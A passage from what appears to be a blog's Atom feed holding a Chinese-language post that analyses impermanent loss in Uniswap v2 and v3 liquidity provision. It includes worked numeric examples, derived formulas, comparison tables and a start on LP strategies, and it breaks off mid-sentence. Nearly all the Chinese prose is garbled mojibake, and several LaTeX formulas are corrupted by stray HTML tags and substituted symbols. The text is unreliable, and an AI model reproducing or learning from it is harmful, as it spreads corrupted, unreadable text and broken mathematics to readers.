çš„æ¥å£æ¥å‡ºå’Œè§£å†³äº‰è®®ï¼Œå¯¹åº”çš„é€»è¾‘æœ‰ç©ºä¹‹åè¯¦è¯´ã€‚</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Across è·¨é“¾æ¡¥åˆçº¦è§£æ
    
    </summary>
    
    
      <category term="åŒºå—é“¾" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Uniswap v3 æ— å¸¸æŸå¤±åˆ†æ</title>
    <link href="https://qiwihui.com/qiwihui-blog-165/"/>
    <id>https://qiwihui.com/qiwihui-blog-165/</id>
    <published>2024-05-15T02:25:31.348Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="uniswap-v3-wu-chang-sun-shi-fen-xi">Uniswap v3 æ— å¸¸æŸå¤±åˆ†æ</span></h1><h2><span id="mu-biao">ç›®æ ‡</span></h2><ol><li>å¯¹ Uniswap v3 æ— å¸¸æŸå¤±çš„å®šé‡åˆ†æï¼›</li><li>å¦‚ä½•ä½¿ç”¨ç­–ç•¥è®© Uniswap v3 LP è·å¾—æ›´å¤§çš„æ”¶ç›Šã€‚</li></ol><span id="more"></span><h2><span id="uniswap-gai-lan">Uniswap æ¦‚è§ˆ</span></h2><p>åŸºäºæ’å®šä¹˜ç§¯çš„è‡ªåŠ¨åŒ–åšå¸‚å•†ï¼ˆAMMï¼‰ï¼Œå»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ã€‚</p><p><strong>v1 ç‰ˆæœ¬:</strong></p><ul><li>2018å¹´11æœˆ</li><li>è§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼šä¼ ç»Ÿäº¤æ˜“æ‰€ order book ä¹°å–åŒæ–¹ä¸æ´»è·ƒå¯¼è‡´çš„é•¿æ—¶é—´æŒ‚å•ï¼Œäº¤æ˜“æ•ˆç‡ä½ä¸‹</li><li>åŠŸèƒ½ï¼šETH â†â†’ ERC20 token å…‘æ¢</li><li>å¸¦æ¥çš„é—®é¢˜ï¼š<ul><li>token1 ä¸ token2 ä¹‹é—´çš„å…‘æ¢éœ€è¦å€ŸåŠ© ETH<ul><li>USDT â†’ ETH â†’ USDC</li></ul></li></ul></li></ul><p><strong>v2 ç‰ˆæœ¬:</strong></p><ul><li>2020å¹´5æœˆ</li><li>æ–°åŠŸèƒ½<ul><li>è‡ªç”±ç»„åˆäº¤æ˜“å¯¹ï¼štoken1 â†â†’ token2<ul><li>token1-token2 äº¤æ˜“æ± </li></ul></li><li>LPers æä¾›æµåŠ¨æ€§å¹¶èµšå–è´¹ç”¨</li><li>ä»·æ ¼é¢„è¨€æœºï¼ˆæ—¶é—´åŠ æƒå¹³å‡ä»·æ ¼ï¼ŒTWAPï¼‰ã€é—ªç”µè´·ã€æœ€ä¼˜åŒ–äº¤æ˜“è·¯å¾„ç­‰</li></ul></li><li>å¸¦æ¥çš„é—®é¢˜<ul><li>èµ„é‡‘åˆ©ç”¨ç‡ä½ï¼š<ul><li>åœ¨ <code>x*y=k</code> çš„æƒ…å†µä¸‹ï¼Œåšå¸‚çš„ä»·æ ¼åŒºé—´åœ¨ (0, +âˆ) çš„åˆ†å¸ƒï¼Œå½“ç”¨æˆ·äº¤æ˜“æ—¶ï¼Œäº¤æ˜“çš„é‡ç›¸æ¯”æˆ‘ä»¬çš„æµåŠ¨æ€§æ¥è¯´æ˜¯å¾ˆå°çš„</li><li>å‡è®¾ ETH/DAI äº¤æ˜“å¯¹çš„å®æ—¶ä»·æ ¼ä¸º 1500 DAI/ETHï¼Œäº¤æ˜“å¯¹çš„æµåŠ¨æ€§æ± ä¸­å…±æœ‰èµ„é‡‘ï¼š4500 DAI å’Œ 3 ETHï¼Œæ ¹æ®Â <code>xâ‹…y=k</code>ï¼Œå¯ä»¥ç®—å‡ºæ± å†…çš„ k å€¼ï¼š <code>k=4500Ã—3=13500</code>ã€‚å‡è®¾Â xÂ è¡¨ç¤º DAIï¼Œy è¡¨ç¤º ETHï¼Œå³åˆå§‹é˜¶æ®µÂ x1=4500ï¼Œy1=3ï¼Œå½“ä»·æ ¼ä¸‹é™åˆ° 1300 DAI/ETH æ—¶ï¼š <code>x2â‹…y2=13500, x2/y2=1300</code>ï¼Œå¾—å‡ºÂ <code>x2=4192.54, y2=3.22</code>ï¼Œèµ„é‡‘åˆ©ç”¨ç‡ä¸ºï¼š <code>Î”x/x1=6.84%</code>ã€‚åŒæ ·çš„è®¡ç®—æ–¹å¼ï¼Œå½“ä»·æ ¼å˜ä¸º 2200 DAI/ETH æ—¶ï¼Œèµ„é‡‘åˆ©ç”¨ç‡çº¦ä¸º <code>21.45%</code>ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨å¤§éƒ¨åˆ†çš„æ—¶é—´å†…æ± å­ä¸­çš„èµ„é‡‘åˆ©ç”¨ä¸ä½äº 25%ï¼Œè¿™ä¸ªé—®é¢˜å¯¹äºç¨³å®šå¸æ± æ¥è¯´æ›´åŠ ä¸¥é‡ã€‚</li></ul></li></ul></li></ul><p><img src="https://user-images.githubusercontent.com/3297411/190839344-efc05df3-293a-422e-bc22-b26311154b12.png" alt="Untitled"></p><p><strong>v3ç‰ˆæœ¬:</strong></p><ul><li>2021å¹´5æœˆ</li><li>è€ƒè™‘é£é™©<ol><li>ä»·æ ¼å½±å“ï¼ˆPrice impactï¼‰ï¼š<ul><li>æ˜¯æŒ‡ä¸€ç¬”äº¤æ˜“å¯¹ä»·æ ¼çš„å½±å“ç¨‹åº¦ï¼Œå–å†³äºæ± å­æ·±åº¦ã€‚ æ›´é«˜çš„ä»·æ ¼å½±å“æ„å‘³ç€ï¼šæµåŠ¨æ€§æä¾›è€…æä¾›çš„æµåŠ¨æ€§ä¸è¶³ï¼Œå‘äº¤æ˜“è€…æä¾›æ›´å·®çš„æ¯”ç‡ï¼ˆæ»‘ç‚¹é«˜ï¼‰ã€‚</li></ul></li><li>å­˜è´§é£é™©ï¼ˆInventory riskï¼‰ï¼š<ul><li>LP çš„ä¸»è¦ç›®æ ‡æ˜¯éšç€æ—¶é—´çš„æ¨ç§»å¢åŠ å…¶æ€»åº“å­˜ä»·å€¼</li><li>åœ¨ä»·æ ¼å˜åŒ–è¿‡ç¨‹ä¸­ï¼Œç›¸å¯¹äºé¦–é€‰ä»·å€¼å­˜å‚¨çš„èµ„äº§è€Œè¨€ï¼ŒLP æ‹¥æœ‰çš„èµ„äº§æ•°é‡æ›´å°‘ï¼Œæ¯”å¦‚å¯¹äº ETH-DAIï¼Œç”¨æˆ·æ›´å€¾å‘äº ETHï¼ˆETHä»·æ ¼å‡é«˜ï¼‰ï¼Œç›¸å¯¹äº ETHè€Œè¨€ï¼ŒLP æ‹¥æœ‰è¶Šå¤šçš„ DAIï¼Œå­˜è´§é£é™©è¶Šé«˜ï¼›</li><li>æ¯”å¦‚ 100% ETH å’Œ 50%-50% ETH-DAI çš„å¯¹æ¯”ï¼ŒETHä»·æ ¼ä¸Šæ¶¨ï¼Œæ›´å¤šäººå°† DAI æ¢æˆ ETHï¼Œç›¸å¯¹åº”LPæ‰‹ä¸­ ETHå°±å°‘äº†ï¼Œé£é™©åŠ å¤§ã€‚</li></ul></li><li>æ— å¸¸æŸå¤±<ul><li>æä¾›æµåŠ¨æ€§æ—¶å‘ç”Ÿçš„èµ„é‡‘æš‚æ—¶æŸå¤±/éæ°¸ä¹…æ€§æŸå¤±ï¼›</li><li>åªè¦ä»£å¸ç›¸å¯¹ä»·æ ¼æ¢å¤åˆ°å…¶åˆå§‹çŠ¶æ€ï¼Œè¯¥æŸå¤±å°±æ¶ˆå¤±äº†ï¼›</li></ul></li></ol></li><li>æ–°åŠŸèƒ½<ul><li>é›†ä¸­æµåŠ¨æ€§ â†’  æå‡èµ„é‡‘åˆ©ç”¨ç‡</li></ul></li></ul><p><img src="https://user-images.githubusercontent.com/3297411/190839359-483c9ed2-e79f-4be9-b489-0af0d86c62b6.png" alt="Untitled 1"></p><pre><code>- å¤šå±‚çº§æ‰‹ç»­è´¹ç‡ï¼ˆ0.05%ï¼Œ0.3%ï¼Œ1%ï¼‰ï¼Œå‡çº§çš„é¢„è¨€æœºï¼ŒåŒºé—´è®¢å•ï¼ˆrange orderï¼‰ç­‰ã€‚</code></pre><ul><li>å¸¦æ¥çš„é—®é¢˜ï¼š<ul><li>ç›¸å¯¹äºv2è€Œè¨€<ul><li>æ— å¸¸æŸå¤±ï¼ˆImpermanent Lossï¼‰ä»ç„¶å­˜åœ¨ï¼Œè€Œä¸”æ›´å¤§ï¼›</li><li>LP çš„æƒè¡¡<ul><li>ä»·æ ¼åŒºé—´è¶Šå¤§ï¼Œæ‰€è·å¾—çš„è´¹ç”¨æ”¶ç›Šå°±è¶Šä½ï¼Œ(0, +âˆ)æ—¶å’Œ v2ä¸€è‡´ã€‚</li><li>ä½†å¦‚æœé€‰æ‹©ä¸€ä¸ªæ›´å°çš„ä»·æ ¼åŒºé—´ï¼Œå°±ä¼šæœ‰æ›´é«˜çš„æ— å¸¸æŸå¤±ã€‚</li></ul></li></ul></li></ul></li></ul><h2><span id="wu-chang-sun-shi-fen-xi">æ— å¸¸æŸå¤±åˆ†æ</span></h2><h3><span id="uniswap-v2">Uniswap v2</span></h3><p><strong>ä¾‹å­ï¼š</strong></p><p>å‡è®¾ ETH/DAI äº¤æ˜“å¯¹çš„å®æ—¶ä»·æ ¼ä¸º 1500 DAI/ETHï¼Œäº¤æ˜“å¯¹çš„æµåŠ¨æ€§æ± ä¸­å…±æœ‰èµ„é‡‘ï¼š4500 DAI å’Œ 3 ETHï¼Œæ ¹æ®Â <code>xâ‹…y=k</code>ï¼Œå¯ä»¥ç®—å‡ºæ± å†…çš„ k å€¼ï¼š <code>k=4500Ã—3=13500</code>ã€‚å‡è®¾Â xÂ è¡¨ç¤º DAIï¼Œy è¡¨ç¤º ETHï¼Œå³åˆå§‹é˜¶æ®µÂ x1=4500ï¼Œy1=3ã€‚</p><p>å½“ä»·æ ¼ä¸‹é™åˆ° 1300 DAI/ETH æ—¶ï¼š <code>x2â‹…y2=13500, x2/y2=1300</code>ï¼Œå¾—å‡ºÂ <code>x2=4192.54, y2=3.22</code> ã€‚</p><p>å¦‚æœç”¨æˆ·é€‰æ‹©HODLï¼Œåˆ™ <code>x2'=4500ï¼Œy2'=3</code>ï¼Œæˆ‘ä»¬åˆ†åˆ«è®¡ç®—ä¸¤ç§æƒ…å†µä¸‹çš„èµ„äº§ä»·å€¼ï¼ˆDAIï¼‰ï¼š</p><p>LP: 4192.54 + 3.22 * 1300 = 8378.54</p><p>HODL: 4500 + 3 * 1300 = 8400</p><p>èµ„äº§å‡å°‘ï¼š8400 - 8378.54 = 21.46 â†’ æ— å¸¸æŸå¤±</p><p>æ— å¸¸æŸå¤±ç‡ï¼š21.46 / 8400 = 0.26%</p><p>å½“ä»·æ ¼å˜ä¸º 2200 DAI/ETHæ—¶ï¼Œx2=5449.77, y2=2.48ï¼Œèµ„äº§å‡å°‘ 194.23ï¼ŒæŸå¤±ç‡ä¸º 1.75%ã€‚</p><p><strong>æ¨¡å‹åˆ†æï¼š</strong></p><p>æ ¹æ®æ’å®šä¹˜ç§¯å…¬å¼ $xy=k$ï¼Œä»¤ $k=L^2$ï¼Œå…¶ä¸­ L è¡¨ç¤ºæµåŠ¨æ€§ï¼Œåˆ™æœ‰ $xy=L^2$ï¼Œå†æ ¹æ®ä»·æ ¼ $S=x/y$ï¼Œå¯ä»¥å¾—åˆ° $x=L/\sqrt{S}$ï¼Œ$y=L\sqrt{S}$ã€‚</p><p>è€ƒè™‘ LP åœ¨æµåŠ¨æ€§æ±  X-Y ä¸­æ·»åŠ æµåŠ¨æ€§ $L$ï¼Œæ± çš„åˆå§‹ä»·æ ¼ä¸º $S_0$ï¼Œæ‰€ä»¥ LP éœ€è¦å‘æµåŠ¨æ€§æ± ä¸­æä¾› $x_0=L/\sqrt{S_0}$çš„ X ä»£å¸å’Œ $y_0=L\sqrt{S_0}$ çš„ Y ä»£å¸ã€‚</p><p>å½“æ± çš„ä»·æ ¼å˜ä¸º $S_1$æ—¶ï¼ŒLP çš„èµ„äº§ä»·å€¼ä¸º</p><p>$$V_{v2,pos}(L, S_1)=S_1 \cdot x_1+y_1=\frac{L}{\sqrt{S_1}}S_1+L\sqrt{S_1}=2L\sqrt{S_1}$$</p><p>å…¶ä¸­ $x_1$å’Œ $y_1$æ˜¯LPåœ¨æ± ä¸­çš„èµ„äº§ã€‚</p><p>LP åˆå§‹æ—¶çš„èµ„äº§å¦‚æœä¸€ç›´æ‹¿æ‰‹é‡Œï¼Œåˆ™ä»·å€¼ä¸º</p><p>$$V_{v2,hold}(L,S_0,S_1)=S_1 \cdot x_0 + y_0=\frac{L}{\sqrt{S_0}}S_1+L\sqrt{S_0}$$</p><p>æ‰€ä»¥ï¼Œæ— å¸¸æŸå¤±ä¸ºï¼š</p><p>$$\begin{aligned}\mathrm{IL}<em>{\mathrm{v} 2}\left(S_0, S_1\right) &amp;=\frac{V</em>{\mathrm{v} 2, \text { pos }}-V_{\mathrm{v} 2, \text { hold }}}{V_{\mathrm{v} 2, \text { hold }}} \&amp;=\frac{2 L \sqrt{S_1}-\left(\frac{L}{\sqrt{S_0}} S_1+L \sqrt{S_0}\right)}{\frac{L}{\sqrt{S_0}} S_1+L \sqrt{S_0}} \&amp;=\left(\frac{2 \cdot \sqrt{\frac{S_1}{S_0}}}{1+\frac{S_1}{S_0}}-1\right)\end{aligned}$$</p><p>ä»¤ $r=S_1/S_0$ï¼Œåˆ™æœ‰ï¼š</p><p>$$\mathrm{IL}_{v2} = \frac{2 \cdot \sqrt{r}}{1+r}-1$$</p><p>ç”¨ä¹‹å‰çš„ä¾‹å­è®¡ç®—ï¼Œr=1300/1500=0.87æ—¶ï¼ŒIL=0.0026=0.26%ï¼Œr=2200/1500=1.47æ—¶ï¼ŒIL=0.018=1.8%ï¼Œä¸ä¸Šè¿°è®¡ç®—ç›¸ç¬¦åˆã€‚</p><p><strong>å›¾åƒï¼š</strong></p><p><img src="https://user-images.githubusercontent.com/3297411/190839374-f568b419-7536-44d0-b988-13dd4982972a.png" alt="Untitled 2"></p><p><a href="https://www.desmos.com/calculator/aza5py3g95">https://www.desmos.com/calculator/aza5py3g95</a></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå½“ $S_0=S_1$æ—¶æ— å¸¸æŸå¤±ä¸º0ï¼Œå…¶ä»–æ—¶å€™æ— å¸¸æŸå¤±éƒ½ä¸ºè´Ÿæ•°ã€‚åˆ—ä¸€ä¸ªè¡¨ï¼š</p><table><thead><tr><th>ä»·æ ¼å˜åŒ–</th><th>æ— å¸¸æŸå¤±</th></tr></thead><tbody><tr><td>0.25x</td><td>20.0%</td></tr><tr><td>0.5x</td><td>5.7%</td></tr><tr><td>0.75x</td><td>1.0%</td></tr><tr><td>1</td><td>0</td></tr><tr><td>1.25x</td><td>0.6%</td></tr><tr><td>1.5x</td><td>2.0%</td></tr><tr><td>1.75x</td><td>3.8%</td></tr><tr><td>2x</td><td>5.7%</td></tr><tr><td>3x</td><td>13.4%</td></tr><tr><td>4x</td><td>20.0%</td></tr><tr><td>5x</td><td>25.5%</td></tr></tbody></table><h3><span id="uniswap-v3">Uniswap v3</span></h3><p>ç”¨åŒæ ·çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬åˆ†æ Uniswap v3çš„æ— å¸¸æŸå¤±ã€‚å‡è®¾ LP å‘ä»·æ ¼åŒºé—´ $[P_a,P_b]$æä¾›æµåŠ¨æ€§  $L$ï¼Œåˆå§‹ä»·æ ¼ä¸º $P_0(\in[P_a,P_b])$ï¼Œä¹‹åä»·æ ¼å˜ä¸º $P_1(\in[P_a,P_b])$ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬ä»Uniswap v3 çš„ç™½çš®ä¹¦ä¸­å¯ä»¥çŸ¥é“ï¼Œé›†ä¸­æµåŠ¨æ€§çš„èµ„äº§å‚¨å¤‡æ›²çº¿ï¼ˆæ©™è‰²ï¼‰çš„å…¬å¼ä¸ºï¼š</p><p>$$\left(x+\frac{L}{\sqrt{p_b}}\right)\left(y+L \sqrt{p_a}\right)=L^2$$</p><p>ï¼ˆæ¨å¯¼ï¼šæ›²çº¿ç›¸å½“äºv2çš„æ›²çº¿å‘å·¦å‘ä¸‹å¹³ç§»åŠ¨ï¼‰</p><p><img src="https://user-images.githubusercontent.com/3297411/190839406-4880142e-70e3-4073-973f-1f9d8830449c.png" alt="Untitled 1"></p><p>å¯¹äºè™šæ‹Ÿæ›²çº¿: $x_{virtual} \cdot y_{virtual} = L^2$ï¼Œå¯ä»¥å¾—åˆ°ï¼š</p><p>$$\begin{aligned}&amp;y=y_{\text {virtual }}-L \sqrt{p_a}=L\left(\sqrt{P}-\sqrt{p_a}\right) \&amp;x=x_{\text {virtual }}-\frac{L}{\sqrt{p_b}}=L\left(\frac{1}{\sqrt{P}}-\frac{1}{\sqrt{p_b}}\right)\end{aligned}$$</p><p>åˆå§‹æ—¶èµ„äº§ä»·å€¼ä¸ºï¼š</p><p>$$\begin{aligned}V_{v3}(P_0) &amp;=y_0+x_0 \cdot P_0 \&amp;=L\left(\sqrt{P_0}-\sqrt{p_a}\right)+L\left(\sqrt{P_0}-\frac{P_0}{\sqrt{p_b}}\right) \&amp;=2 L \sqrt{P_0}-L\left(\sqrt{p_a}+\frac{P_0}{\sqrt{p_b}}\right)\end{aligned}$$</p><p>åŒæ ·ï¼Œåˆ™åœ¨ä»·æ ¼ $P_1$æ—¶æµåŠ¨æ± ä¸­çš„èµ„äº§ä»·å€¼ä¸ºï¼ˆä»¤ $r=P_1/P_0$ï¼‰ï¼š</p><p>$$\begin{aligned}V_{v3,pos}(P_1) &amp;=2 L \sqrt{P_1}-L\left(\sqrt{p_a}+\frac{P_1}{\sqrt{p_b}}\right) \ &amp;=2 L \sqrt{rP_0}-L\left(\sqrt{p_a}+\frac{rP_0}{\sqrt{p_b}}\right)\end{aligned}$$</p><p>åœ¨ä»·æ ¼ä¸º $P_1$ æ—¶çš„ï¼Œé€‰æ‹© HODL çš„èµ„äº§ä»·å€¼ä¸ºï¼š</p><p>$$\begin{aligned}V_{\text {v3,hold}}(P_1) &amp;=y_0+x_0 P_1 \&amp;=L\left(\sqrt{P_0}-\sqrt{p_a}\right)+P_1 \cdot L\left(\frac{1}{\sqrt{P_0}}-\frac{1}{\sqrt{p_b}}\right) \&amp;=L\left(\sqrt{P_0}-\sqrt{p_a}\right)+L \cdot rP _0\left(\frac{1}{\sqrt{P_0}}-\frac{1}{\sqrt{p_b}}\right) \&amp;=L \sqrt{P_0}(1+r)-L\left(\sqrt{p_a}+\frac{rP_0 }{\sqrt{p_b}}\right)\end{aligned}$$</p><p>æ‰€ä»¥æ— å¸¸æŸå¤±ä¸ºï¼ˆä¸å¤±ä¸€èˆ¬æ€§ï¼Œå– $P_0$ä¸º $P$ï¼‰ï¼š</p><p>$$\begin{aligned}\mathrm{IL}<em>{a, b}Â® &amp;=\frac{V</em>{pos}-V_{\text {hold }}}{V_{\text {hold }}} \&amp;=\frac{2 L \sqrt{rP}-L \sqrt{P}(1+r)}{L \sqrt{P}(1+r)-L\left(\sqrt{p_a}+\frac{rP}{\sqrt{p_b}}\right)} \&amp;=\frac{2 \sqrt{r}-1-r}{1+r-\sqrt{\frac{p_a}{P}}-r \sqrt{\frac{P}{p_b}}} \&amp;=\operatorname{IL}Â® \cdot\left(\frac{1}{1-\frac{\sqrt{\frac{p_a}{P}}+r \sqrt{\frac{P}{p_b}}}{1+r}}\right)\end{aligned}$$</p><p>ï¼ˆ $P_1$ åœ¨ä»·æ ¼åŒºé—´ $[0,P_b]$ï¼Œ$[P_a,+\infty]$æ—¶çš„æ— å¸¸æŸå¤±ä¹ŸåŒæ ·å¯ä»¥è®¡ç®—ã€‚ï¼‰</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»·æ ¼åŒºé—´ $[P_a, P_b]$ çš„å˜åŒ–çœ‹åˆ°ï¼š</p><ol><li>åœ¨ $P_a=P_b=P$æ—¶ï¼Œ IL = 0ï¼›</li><li>å½“ $r=1$ æ—¶ï¼Œ IL = 0ï¼›</li><li>ä¸ v2 çš„è”ç³»ï¼š</li></ol><p>$$p_a=0, p_b \rightarrow \infty, \mathrm{IL}<em>{v3}=\frac{2 \cdot \sqrt{r} -1-r}{1+r}=\mathrm{IL}</em>{v2}$$</p><p>è¶‹è¿‘äº $\mathrm{IL}_{v2}$ã€‚</p><p><strong>ç”»å›¾</strong></p><p><img src="https://user-images.githubusercontent.com/3297411/190839418-ebe47fa1-2446-431d-bceb-1e01ddd454a4.png" alt="Untitled 3"></p><p><a href="https://www.desmos.com/calculator/ha322rtufc">https://www.desmos.com/calculator/ha322rtufc</a></p><p>åŒæ ·æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼šå½“ä»·æ ¼åŒºé—´è¶Šå°æ—¶ï¼Œæ— å¸¸æŸå¤±è¶Šå¤§ï¼š</p><p>ï¼ˆè¿™æ˜¯ä¸€ä¸ªåŠ¨å›¾ï¼‰</p><p><img src="https://user-images.githubusercontent.com/3297411/190839425-25812665-4d4c-4b3a-bb0e-38378036b31d.gif" alt="Untitled"></p><p>æ•°å€¼<strong>æ¯”è¾ƒ</strong></p><p>æˆ‘ä»¬æ¯”è¾ƒåœ¨ä¸åŒçš„ä»·æ ¼åŒºé—´ä¸‹ Uniswap v3çš„æ— å¸¸æŸå¤±ï¼š</p><img width="757" alt="Screen_Shot_2022-08-31_at_09 56 06" src="https://user-images.githubusercontent.com/3297411/190839436-dc4969bd-51d7-4a30-a86e-9d50930fdc85.png"><p>å…·ä½“æ•°æ®ï¼ˆï¼‰ï¼š</p><table><thead><tr><th>ä»·æ ¼åŒºé—´%</th><th>-20%</th><th>Initial</th><th>+20%</th></tr></thead><tbody><tr><td>[0%,Inf]( Uniswap v2 )</td><td>-0.56%</td><td>0</td><td>-0.46%</td></tr><tr><td>[0%, 200%]</td><td>-0.86%</td><td>0</td><td>-0.70%</td></tr><tr><td>[25%, 175%]</td><td>-1.5%</td><td>0</td><td>-1.22%</td></tr><tr><td>[50%, 150%]</td><td>-2.34%</td><td>0</td><td>-1.91%</td></tr><tr><td>[75%, 125%]</td><td>-4.75%</td><td>0</td><td>-3.8%</td></tr></tbody></table><p>æé—®ï¼šæ—¢ç„¶æ— å¸¸æŸå¤±æ€»æ˜¯ä¸ºè´Ÿï¼Œä¸ºä»€ä¹ˆè¿˜æ˜¯ä¼šæœ‰äººæ„¿æ„åš LPï¼Ÿ</p><p>æˆ‘ä»¬çš„è®¡ç®—å¿½ç•¥äº†ä¸¤ä¸ªé—®é¢˜ï¼š</p><ol><li>æ‰‹ç»­è´¹ï¼ˆfeeï¼‰ï¼šä¸åŒçš„æ± å­æä¾›ä¸åŒçš„æ‰‹ç»­è´¹ï¼Œéœ€è¦åœ¨åŸæ¥çš„è®¡ç®—ä¸ŠåŠ ä¸Šæ‰‹ç»­è´¹ã€‚</li><li>é›†ä¸­æµåŠ¨æ€§å¢åŠ äº†æ± çš„æ·±åº¦ï¼š<ul><li><p>ä¾‹å¦‚ï¼šETH-USDC-0.3%æ± çš„æµåŠ¨æ€§</p><p><img src="https://user-images.githubusercontent.com/3297411/190839469-259db8d9-b51e-47c9-8444-06399598866e.png" alt="Untitled 4"></p></li><li><p>ä¸€äº›æµè¡Œçš„ token å¯¹çš„æ·±åº¦æ¯”ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ï¼ˆBinance, Coinbaseï¼‰æ›´é«˜ã€‚<a href="https://uniswap.org/blog/uniswap-v3-dominance">link</a></p><ul><li><p>large-cap: ETH/dollar</p></li><li><p>mid-cap - cross-chain pairs</p><p><img src="https://user-images.githubusercontent.com/3297411/190839462-ae80daf8-398c-4dac-bc90-482a62fd3388.png" alt="Untitled 5"></p></li></ul></li></ul></li></ol><pre><code>    - ç¨³å®šå¸ä¸ç¨³å®šå¸å¯¹: USDC/USDT</code></pre><h3><span id="cong-zi-chan-jie-zhi-de-jiao-du"><strong>ä»èµ„äº§ä»·å€¼çš„è§’åº¦</strong></span></h3><p>æ¯”è¾ƒä»¥ä¸‹äº”ç§èµ„äº§æŒæœ‰ç­–ç•¥</p><ol><li>100% æŒæœ‰ ETH</li><li>100% æŒæœ‰ USDC</li><li>50% æŒæœ‰ ETHï¼Œ50% æŒæœ‰ USDC</li><li>ä½¿ç”¨ 50%ETH ä¸ 50%USDC å‚ä¸åšå¸‚ - Uniswap v2</li><li>ä½¿ç”¨ 50%ETH ä¸ 50%USDC å‚ä¸åšå¸‚ - Uniswap v3</li></ol><p>æ¯”è¾ƒè¿™äº”ç§ç­–ç•¥çš„èµ„äº§ä»·å€¼ã€‚ï¼ˆä½¿ç”¨ <a href="https://defi-lab.xyz/uniswapv3simulator">https://defi-lab.xyz/uniswapv3simulator</a>ï¼‰</p><p>æ— æ‰‹ç»­è´¹æ—¶ï¼š</p><img width="838" alt="Untitled 6" src="https://user-images.githubusercontent.com/3297411/190839480-ae2dbd81-24c7-4692-8ec5-c682b28937ea.png"><p>åŒ…å«æ‰‹ç»­è´¹æ—¶ï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/190839487-0004de8e-9500-42e6-95dd-3cf5dca0e737.png" alt="Untitled 7"></p><p>Uniswap V3 æ—¢æ˜¯æŠ•èµ„è€…æ”¶ç›Šçš„æ”¾å¤§å™¨ï¼Œä¹Ÿæ˜¯é£é™©çš„æ”¾å¤§å™¨ã€‚åœ¨äº«å—æ›´é«˜æŠ•èµ„æ”¶ç›Šçš„åŒæ—¶ï¼Œä¹Ÿå¿…ç„¶è¦æ‰¿æ‹…å½“ä»·æ ¼è„±ç¦»å®‰å…¨èŒƒå›´æ—¶æ›´å¤šçš„æ— å¸¸æŸå¤±ã€‚</p><h2><span id="ru-he-tong-guo-ce-lue-jiang-di-sun-shi-huo-zhe-shuo-zeng-jia-shou-yi">å¦‚ä½•é€šè¿‡ç­–ç•¥é™ä½æŸå¤±ï¼Œæˆ–è€…è¯´å¢åŠ æ”¶ç›Šï¼Ÿ</span></h2><h3><span id="ce-lue-0-zai-bu-zhu-dong-diao-zheng-de-qing-kuang-xia-xuan-ze-bi-v2-biao-xian-geng-hao-de-chi-zi">ç­–ç•¥0ï¼šåœ¨ä¸ä¸»åŠ¨è°ƒæ•´çš„æƒ…å†µä¸‹é€‰æ‹©æ¯”v2è¡¨ç°æ›´å¥½çš„æ± å­</span></h3><p>åœ¨ä¸ä¸»åŠ¨è°ƒæ•´æƒ…å†µä¸‹ï¼Œå…¨èŒƒå›´ï¼ˆfull rangeï¼‰çš„ Uniswap v3 å¤´å¯¸å’Œä»·æ ¼é™å®šçš„ç¨³å®šå¸å¤´å¯¸çš„æ‰‹ç»­è´¹å›æŠ¥å¹³å‡æ¯” Uniswap v2 å¥½çº¦ 54%ã€‚å…¶ä¸­</p><ul><li>100 åŸºç‚¹æ‰‹ç»­è´¹çš„å…¨èŒƒå›´ v3 å¤´å¯¸æ¯” v2 å¹³å‡<strong>å¥½</strong> ~80%ã€‚</li><li>1 åŸºç‚¹ï¼ŒèŒƒå›´é™å®šçš„ v3 ç¨³å®šå¸å¯¹ï¼Œv2 ï¼Œå¹³å‡<strong>å¥½</strong> ~160%.</li><li>30 åŸºç‚¹ï¼Œå…¨èŒƒå›´ v3 å¤´å¯¸ï¼Œ v2 å¹³å‡<strong>å¥½</strong> ~16%.</li><li>5 åŸºç‚¹ï¼Œå…¨èŒƒå›´ v3 å¤´å¯¸ï¼Œv2  å¹³å‡<strong>å·®</strong> ~68%.</li></ul><p>é€šå¸¸å»ºè®® LPers é€‰æ‹© v3ã€‚<a href="https://uniswap.org/blog/fee-returns">link</a></p><p>é€‰æ‹©å“ªä¸ªæ± ï¼Ÿ</p><p><img src="https://user-images.githubusercontent.com/3297411/190839496-8d41b11a-d26a-479c-8441-c481f3aa26e9.png" alt="Untitled 8"></p><p>v3 è¡¨ç°æ›´å¥½çš„æ˜¯ 100 åŸºç‚¹è´¹ç‡æˆ– 1 åŸºç‚¹è´¹ç‡çš„ç¨³å®šå¸å¯¹ã€‚</p><p>100 bps çš„ token å¯¹é€šå¸¸æµåŠ¨æ€§è¾ƒå·®ï¼Œéƒ¨ç½²æ—¶é—´è¾ƒæ™šä¸”æ³¢åŠ¨æ€§è¾ƒå¤§ã€‚ å¯¹äº 1-bp è´¹ç”¨ç­‰çº§ï¼Œä»£å¸å¯¹ä»·æ ¼æ³¢åŠ¨è¾ƒå°ï¼Œä½† Uniswap v3 çš„äº¤æ˜“é‡è¿œé«˜äº v2ã€‚ 1-bp æ± ä¸Šçš„é›†ä¸­æµåŠ¨æ€§å®ç°äº†è¶…è¿‡ v2 çš„é«˜å›æŠ¥ã€‚</p><h3><span id="ce-lue-yi-zhu-dong-de-bei-dong-ce-lue">ç­–ç•¥ä¸€ï¼šä¸»åŠ¨çš„è¢«åŠ¨ç­–ç•¥</span></h3><p>å¦‚æœåˆå§‹æŠ•å…¥æ˜¯ 50%ETH å’Œ50%USDCï¼Œå½“ä»·æ ¼å˜åŒ–æ—¶ï¼Œæ± ä¸­å‰©ä½™çš„èµ„äº§æ¯”ä¾‹å¯èƒ½å˜æˆ 80%ETH å’Œ 20%USDCï¼Œè¿™æ—¶ä½ 